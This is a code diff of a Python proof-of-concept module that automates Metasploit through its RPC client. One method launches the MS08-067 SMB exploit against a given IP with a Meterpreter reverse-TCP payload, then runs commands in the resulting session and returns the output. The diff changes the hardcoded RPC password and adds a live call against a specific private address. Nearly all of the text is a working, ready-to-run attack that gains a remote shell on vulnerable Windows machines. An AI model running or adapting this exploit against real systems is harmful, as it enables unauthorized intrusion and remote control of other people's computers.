@@ -27,14 +27,13 @@ class poc_module:
             shell = client.sessions.session(session_number)
             shell.write('dir')
             result = shell.read()
-            print(result)
-            result.split(' ')
-            return result[:240:]
+            final_result = "\n".join(result.splitlines()[4:10])
+            return final_result
         else:
             print("null")
             return "NULL"
     def ms08067_poc(self):
-        client = MsfRpcClient('XzQLJcrt', port=55552,ssl=False)
+        client = MsfRpcClient('1qaz@WSX',ssl=False)
         exploit = client.modules.use('exploit','windows/smb/ms08_067_netapi')
         exploit['RHOSTS']  = str(self.ip)
         result = exploit.execute(payload='windows/meterpreter/reverse_tcp')
@@ -42,16 +41,17 @@ class poc_module:
         if bool(client.sessions.list):
             session_number = list(client.sessions.list.keys())[0]
             shell = client.sessions.session(session_number)
-            shell.write('netstat')
+            shell.write('dir')
             result = shell.read()
-            print(result)
-            result.split(' ')
-            print(result)
-            return result[:240:]
+            final_result = "\n".join(result.splitlines()[4:10])
+           
+            return final_result
+            # print(result.split(" "))
+            return result
         else:
             print("null")
             return "NULL"
 
 # data = {"prove":""}
-# data['prove'] = poc_module("10.10.174.61").ms17010_poc()
+print(poc_module("192.168.1.106").ms08067_poc())
 # print(data['prove'])
